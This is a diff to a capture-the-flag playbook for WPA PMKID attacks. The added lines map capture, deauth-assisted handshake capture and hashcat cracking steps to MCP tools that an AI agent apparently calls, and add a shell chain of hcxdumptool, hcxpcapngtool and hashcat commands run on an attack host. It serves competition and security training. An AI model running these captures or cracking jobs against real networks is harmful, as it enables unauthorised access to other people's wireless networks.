@@ -1,5 +1,7 @@
 # PMKID fastpath — the WCTF speedrun
 
+**Verified against:** hcxdumptool 7.3 / hashcat 6.2.x as of 2026-Q3
+
 ## Recognition
 
 Beacon RSN IE has PMKID Count > 0, or (more commonly) beacon says 0
@@ -38,6 +40,31 @@ it decrypts a target frame in the capture that contains the flag
 - **PSK not in rockyou.** Move to masks + SSID-derived wordlists
   (see cracking-tradecraft — future write). Try common patterns:
   `<vendor_prefix><4-digit><4-digit>`, MAC-suffix derivations.
+
+## MCP mapping
+
+All actions in the sequence above map to real tools in `src/`:
+
+- `recon_start` / `recon_stop` → `server.recon_start` / `server.recon_stop`.
+- `capture_pmkid` → `server.do_capture_pmkid` (SSH-backed hcxdumptool).
+- `capture_handshake` → `server.do_capture_handshake` (SSH-backed
+  hcxdumptool + optional deauth).
+- `convert_to_hashcat` → `server.convert_to_hashcat` / `server.extract_pmkids`.
+- `crack_start` → `server.crack_start` (hashcat 22000).
+
+Also available as `run_sequence` actions with identical parameter names —
+see `orchestrate.py::_dispatch`.
+
+## Fallback shell chain (no MCP)
+
+```bash
+# on the Pineapple / attack host
+sudo hcxdumptool -i wlan1 -c 6a --bpf=<bpf-filter> \
+    -w /tmp/pmkid.pcapng --enable_status=1
+# stop after ~60 s; run:
+hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng
+hashcat -m 22000 /tmp/hs.22000 /opt/wordlists/rockyou.txt
+```
 
 ## Cite
 
